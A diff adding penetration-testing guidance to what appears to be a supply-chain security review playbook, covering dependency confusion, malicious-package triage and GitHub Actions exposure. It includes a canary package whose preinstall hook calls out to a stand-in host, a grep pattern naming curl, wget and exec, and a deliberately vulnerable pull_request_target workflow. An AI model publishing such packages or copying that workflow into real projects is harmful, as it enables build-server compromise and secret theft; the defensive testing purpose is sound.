@@ -43,6 +43,131 @@ Use when reviewing an application's dependency tree, SBOM, package manifests, or
 5. **Assess CI/CD exposure.** Review pipeline definitions for unpinned base images, unverified third-party actions/plugins, secrets passed to external steps, and write-access to artifact stores.
 6. **Switch logic.** If the SBOM is absent, request generation or reconstruct from lockfiles; if confusion is blocked, pivot to malicious-package social-engineering vectors.
 
+## Reconnaissance Commands
+
+### Manifest + Lockfile Extraction
+
+```bash
+find . -maxdepth 3 -name "package.json" -o -name "package-lock.json" \
+  -o -name "yarn.lock" -o -name "requirements*.txt" -o -name "Pipfile*" \
+  -o -name "go.mod" -o -name "pom.xml" -o -name "*.csproj" 2>/dev/null
+```
+
+### Dependency Tree with Registry Sources
+
+```bash
+npm ls --all --json > deps.json
+grep -o '"resolved": "[^"]*"' package-lock.json | sort -u
+```
+
+Flag any `resolved` URL pointing at public registries for packages that should be private.
+
+### SBOM Generation
+
+```bash
+npx @cyclonedx/cyclonedx-npm --output-file sbom.json
+syft dir:. -o cyclonedx-json > sbom.json
+```
+
+## Dependency Confusion Testing
+
+### Public-Registry Shadow Check
+
+For each private name, check if it exists publicly:
+
+```bash
+for pkg in $(jq -r '.packages[].location // empty' private-names.txt); do
+  code=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
+  [ "$code" = "200" ] && echo "PUBLIC SHADOW: $pkg"
+done
+```
+
+Same for PyPI:
+
+```bash
+curl -s -o /dev/null -w "%{http_code}\n" https://pypi.org/pypi/<internal-name>/json
+```
+
+### Canary Package Validation
+
+Register the internal name publicly with a harmless placeholder that phones home on install:
+
+```json
+{
+  "name": "<internal-package-name>",
+  "version": "99.99.99",
+  "scripts": {
+    "preinstall": "curl -s https://canary.example.com/hit?pkg=$npm_package_name"
+  }
+}
+```
+
+`npm publish` — if any build installs it, dependency confusion is CONFIRMED with build-server callback evidence.
+
+## Malicious Package Triage
+
+### Install-Script Audit
+
+```bash
+npm view <pkg> scripts
+cat node_modules/<pkg>/package.json | jq '.scripts'
+```
+
+Any `preinstall`/`postinstall` invoking `curl`, `wget`, `node -e`, base64 blobs, or child_process is suspect:
+
+```bash
+grep -rE "(curl|wget|child_process|eval|exec|atob|Buffer.from\(['\"]...)" node_modules/<suspect>/ --include="*.js" -l
+```
+
+### Typosquat Similarity
+
+```python
+from difflib import get_close_matches
+popular = ["express", "lodash", "react", "requests", "boto3"]
+print(get_close_matches("<candidate>", popular, cutoff=0.85))
+```
+
+Also check Levenshtein distance ≤ 2 against top-1000 names and lookalike Unicode homoglyphs.
+
+### Maintainer + Publish Metadata
+
+```bash
+npm view <pkg> maintainers time.created time.modified dist.unpackedSize
+```
+
+Newly created + single maintainer + recent republish of an abandoned popular name = classic account-takeover pattern.
+
+## CI/CD Exposure Assessment
+
+### pull_request_target Misuse (GitHub Actions)
+
+Dangerous pattern — checkout of untrusted PR code running with repo secrets:
+
+```yaml
+on: pull_request_target
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}   # attacker-controlled
+      - run: npm install        # executes attacker's postinstall WITH secrets
+        env:
+          API_TOKEN: ${{ secrets.API_TOKEN }}             # exposed to PR author
+```
+
+### Pipeline Hygiene Checks
+
+```bash
+# Unpinned third-party actions (tag instead of SHA)
+grep -rE "uses:\s+[^\s]+@[a-z]+" .github/workflows/
+# Secrets leaking into fork-visible steps
+grep -rn "secrets\." .github/workflows/ | grep -v "push:"
+```
+
+Verify base images are digest-pinned (`image@sha256:...`) and artifact registries require authentication.
+
 ## Pitfalls
 - Trusting lockfile integrity without checking resolved registry source.
 - Missing transitive dependencies hidden behind scoped aliases.
